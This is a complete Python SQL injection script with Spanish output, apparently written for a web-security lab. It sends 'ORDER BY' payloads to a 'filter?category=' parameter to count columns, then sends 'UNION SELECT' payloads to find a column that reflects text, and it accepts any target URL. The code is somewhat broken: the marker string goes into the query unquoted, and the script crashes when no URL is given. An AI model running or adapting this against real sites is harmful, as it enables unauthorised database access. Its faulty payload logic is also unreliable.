#!/usr/bin/python3

from pwn import *
import sys
import requests
import time, signal, urllib3
from bs4 import BeautifulSoup

#DisableHTTPSWarnings
urllib3.disable_warnings()

#ctrl_function
def ctrl_function(sig, frames):
	print("\n[!]Saliendo...\n")
	sys.exit(1)


signal.signal(signal.SIGINT, ctrl_function)

#proxies
proxies = { 'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080' }

def sql_UnionExploit(url):
	uri = "filter?category="
	bar = log.progress("[!] Iniciando Injection")
	bar.status("[!] Determinando el numero de columnas")

	for i in range(1,50):
		payload = "'+order+by+%s--" %i
		r = requests.get(url + uri + payload, verify=False, proxies=proxies)
		resp = r.text
		if "Internal Server Error" in resp:
			return i - 1
		else:
			i += 1
	return False

def sql_TextColumnExploit(url, num_column):
	uri = "filter?category="
	bar2 = log.progress("[!] Testing...")
	bar2.status("[!] La columna que contiene texto ")

	for i in range(1, num_column+1):
		retrieve_String = 'KgTIrN'
		payload = ['NULL'] * num_column
		payload[i-1] = retrieve_String
		payload = "' union select " + ','.join(payload) + "--"
		r = requests.get(url + uri + payload, verify=False, proxies=proxies)
		resp = r.text
		if retrieve_String.strip('\'') in resp:
			return i
	return False


def helPanel():
	print("[!]Usage %s URL " % sys.argv[0])
	print("[!]Example python3 %s www.mipagina.com " % sys.argv[0])


if __name__ == '__main__':
	try:
		url = sys.argv[1].strip()
	except IndexError:
		helPanel()

num_column= sql_UnionExploit(url)

if num_column:
	print("[+] El numero de columna es: %d " %num_column)
	print("[!] Determinando cual columna contiene texto")
	text_column = sql_TextColumnExploit(url, num_column)
	if text_column:
		print("[+] La columna que contiene texto es ", str(text_column))
	else:
		print("[-] No se determino la columna que contiene texto")
else:
		print("[-] La injection no fue exitosa")

